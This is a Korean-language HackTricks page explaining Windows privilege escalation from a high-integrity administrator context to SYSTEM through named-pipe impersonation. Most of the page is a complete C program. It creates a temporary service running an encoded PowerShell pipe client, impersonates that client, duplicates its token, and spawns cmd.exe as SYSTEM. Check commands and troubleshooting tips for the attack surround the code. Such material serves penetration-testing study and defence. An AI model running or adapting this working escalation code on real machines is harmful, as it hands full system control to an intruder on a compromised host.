# 높은 Integrity에서 SYSTEM으로, Name Pipes 사용

{{#include ../../banners/hacktricks-training.md}}

이는 named-pipe impersonation의 **administrator/SCM variant**입니다. elevated process가 임시 service를 생성하고, 해당 service의 child가 `SYSTEM`으로 연결된 다음 그 client를 impersonate합니다. 시작 context에서 service를 생성할 수 없지만 `SeImpersonatePrivilege`가 있다면 대신 privileged-service coercion을 사용하세요. [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) 및 [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md)를 참조하세요. Service를 생성하려면 SCM에 대한 access와 새 service에 대한 `SERVICE_START` access가 필요하며, `CreateProcessWithTokenW`에는 `SeImpersonatePrivilege`가 필요합니다.<sup>[[2]](#references)[[3]](#references)</sup>

예상되는 시작 context를 빠르게 확인합니다:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Code flow:**

1. 서비스 시작 **전에** named-pipe server를 생성합니다. 대기할 때 `ConnectNamedPipe`가 `FALSE`를 반환하더라도 `ERROR_PIPE_CONNECTED`인 경우 성공으로 처리합니다. 이는 `CreateNamedPipe`와 `ConnectNamedPipe` 사이에 client가 경쟁에서 이겨 연결되었다는 의미입니다.<sup>[[4]](#references)</sup>
2. 생성된 pipe에 연결하여 무언가를 쓰는 service를 생성하고 시작합니다. service code는 다음 encoded PS code를 실행합니다: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. service가 연결하여 데이터를 쓴 후 `ImpersonateNamedPipeClient`를 호출하고, 생성된 thread token을 연 다음 primary token으로 duplicate합니다.<sup>[[1]](#references)</sup>
4. 해당 primary token을 사용하여 `cmd.exe`를 spawn합니다.<sup>[[2]](#references)</sup>

이 경로는 caller가 service를 생성하고 시작할 수 있으며 `CreateProcessWithTokenW`에 필요한 privileges(일반적으로 `SeImpersonatePrivilege`)를 보유하고 있다고 가정합니다. 이는 high-integrity-to-SYSTEM technique이며, 임의의 low-privileged user가 사용할 수 있는 primitive가 아닙니다.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> service 생성 또는 시작에 실패하면 sample이 pipe thread에 signal을 보내지 않으므로 무기한 대기할 수 있습니다. lab 외부에서 사용하기 전에 error handling과 overlapped pipe timeout을 추가하십시오. 또한 충돌을 방지하기 위해 random pipe/service name을 사용하십시오.

`ImpersonateNamedPipeClient`는 **마지막으로 읽은 message**와 연결된 context를 채택하므로, 연결만으로는 충분하지 않습니다. privileged client가 데이터를 쓰도록 하고, `ReadFile`이 데이터를 반환했는지 확인한 후에만 impersonate하십시오. thread impersonation token을 `SecurityImpersonation`을 사용하는 `TokenPrimary` token으로 duplicate하십시오. process-creation API가 소비하는 것은 primary token입니다.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### 오류 분류

- `ConnectNamedPipe == FALSE`와 함께 `ERROR_PIPE_CONNECTED`가 반환됨: 계속 진행합니다. pipe는 이미 연결되어 있습니다.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient`가 `ERROR_CANNOT_IMPERSONATE` (`1368`)와 함께 실패함: SYSTEM client가 실제로 data를 작성했으며 `ReadFile`이 완료되었는지 확인합니다. 또한 client가 요청한 impersonation level을 확인합니다. identification/anonymous-level client는 완전히 impersonate할 수 없습니다.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW`가 `ERROR_PRIVILEGE_NOT_HELD` (`1314`)와 함께 실패함: 원래 caller가 `SeImpersonatePrivilege`를 보유하지 않은 것입니다. high-integrity administrator context에서는 [SeImpersonate from High To System](seimpersonate-from-high-to-system.md)에 설명된 token-copy route를 사용하거나, 필요한 privilege가 있다면 SYSTEM을 impersonate하는 동안 `CreateProcessAsUserW`를 사용합니다.<sup>[[2]](#references)</sup>
- `CreateServiceA`가 `ERROR_SERVICE_EXISTS` (`1073`)를 반환함: 기존 `PiperSrv` entry를 삭제하거나 `PIPESRV`를 randomize합니다. trigger 후에는 항상 temporary service를 삭제합니다.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
